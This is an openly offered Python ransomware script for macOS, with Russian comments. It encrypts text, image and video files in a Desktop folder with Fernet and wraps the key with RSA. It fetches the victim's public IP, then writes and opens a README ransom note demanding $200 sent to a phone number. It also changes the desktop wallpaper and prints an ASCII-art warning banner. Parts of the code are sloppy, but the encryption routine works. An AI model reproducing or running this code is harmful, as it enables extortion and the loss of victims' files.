import os
import time
import urllib.request
import datetime
import time
import urllib.request
import datetime
import requests
from cryptography.fernet import Fernet
from Crypto.PublicKey import RSA
from Crypto.Cipher import PKCS1_OAEP
from appscript import app, mactypes
import subprocess
import webbrowser



class Ransomware:
    #extensions for files/расширения шифруемых файлов
    exts = ['txt', 'png', 'mp4', 'jpg', 'jpeg',]

    #Функции для генерация ключа и расположения файлов вымогателя
      

    def __init__(self, targetDir=f"{os.path.expanduser('~')}Desktop"):
        self.ransomKey = None
        self.crypter = None
        self.publicKey = None
        self.homeDir = os.path.expanduser('~')
        #Директория
        self.targerDir = '/Users/apple/Desktop/записи экрана/'
        self.publicIP = requests.get('https://api.ipify.org').text
      

    def gen_ransom_key(self):
        self.ransomKey = Fernet.generate_key()
        self.crypter = Fernet(self.ransomKey)

    def write_ransom_key(self):
        with open('key.txt', 'wb') as f:
            f.write(self.ransomKey)

    def encrypt_ransom_key(self):
        with open('key.txt', 'rb') as f:
            ransomKey = f.read()
        with open('key.txt', 'wb') as f:
            self.publicKey = RSA.import_key(open('public.pem').read())
            publicEncryptor = PKCS1_OAEP.new(self.publicKey)
            encryptedRansomKey = publicEncryptor.encrypt(ransomKey)
            f.write(encryptedRansomKey)
        self.ransomKey = encryptedRansomKey
        self.crypter = None

    #Само шифрование файлов

    def encrypt_file(self, path, encrypted=False):
        with open(path, 'rb') as f:
            data = f.read()
            if not encrypted:
                _data = self.crypter.encrypt(data)
            else:
                _data = self.crypter.decrypt(data)
        with open(path, 'wb') as f:
            f.write(_data)

    def encrypt_system(self, encrypted=False):
        system = os.walk(self.targerDir, topdown=True)
        for root, _, files in system:
            for file in files:
                path = os.path.join(root, file)
                if not file.split('.')[-1] in self.exts:
                    continue
                if not encrypted:
                    self.encrypt_file(path)
                else:
                    self.encrypt_file(path, encrypted=True)



#ОЧЕНЬ КРУТОЙ АРТ
print("─────█─▄▀█──█▀▄─█─────")
print("────▐▌──────────▐▌────")
print("────█▌▀▄──▄▄──▄▀▐█────")
print("───▐██──▀▀──▀▀──██▌───")
print("──▄████▄──▐▌──▄████▄──")
print("ATTENTION YOUR FILES HAVE BEING ENCRYPTED!!!!\n OPEN .txt file and read information about that!")


@staticmethod


#функции для открытия инструкций
def how_to_pay():
        url = 'https://bitcoin.org'
        webbrowser.open(url)

#сообщение о выкупе
def ransom_note():
        
        with open('README.txt', 'w') as f:
            f.write(f'''
            The harddisk of your computer have been encrypted!
            Dont' panic!
            Follow the instructions:

            1.Take your phone and pay 200$ on number +79999999
            2.Wait about 3 days and we will give you decrypt pack
            3.If you start use antivirus,or encryption progs you loose your files!!!

            ''')


  #Вызывает текстовый редактор с сообщением об выкупе
subprocess.call(['open', '-a', 'TextEdit', 'README.txt'])

#Смена обоев работает только для мак!!!картинку и путь к ней можно указать свою
from appscript import app, mactypes
app('Finder').desktop_picture.set(mactypes.File('/Users/apple/Downloads/anon.jpeg'))





      










#вызовв всех функций
def main():



    targerDir = '/Users/apple/Desktop/записи экрана/'
    pyransom = Ransomware()
    pyransom.gen_ransom_key()
    pyransom.encrypt_system()
    pyransom.write_ransom_key()
    pyransom.encrypt_ransom_key()
    ransom_note()
   
    
if __name__ == '__main__':
	main()







